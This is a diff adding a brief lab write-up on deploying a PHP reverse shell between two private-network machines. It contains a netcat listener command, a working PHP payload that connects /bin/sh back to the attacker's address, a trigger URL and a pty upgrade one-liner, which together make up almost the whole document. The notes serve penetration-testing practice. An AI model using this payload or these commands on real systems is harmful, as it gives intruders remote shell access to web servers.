@@ -1,0 +1,41 @@
+PHP Reverse Shell ()
+🔹 Purpose
+Simulated remote access by deploying a PHP reverse shell from the attacker (192.168.1.30) to the victim (192.168.1.33).
+
+🔹 Why PHP?
+Widely used on web servers
+
+Easy to deploy via file upload or injection
+
+Simulates real-world web-based exploits
+
+🔹 Steps
+Start listener (attacker):
+
+bash
+Copy
+Edit
+nc -lvnp 4444
+Upload shell.php to victim:
+
+php
+Copy
+Edit
+<?php
+$sock=fsockopen("192.168.1.30",4444);
+$proc=proc_open("/bin/sh", [0=>$sock, 1=>$sock, 2=>$sock], $pipes);
+?>
+Trigger shell:
+
+arduino
+Copy
+Edit
+http://192.168.1.33/shell.php
+Shell connected (as www-data)
+
+Upgrade shell:
+
+bash
+Copy
+Edit
+python3 -c 'import pty; pty.spawn("/bin/bash")'
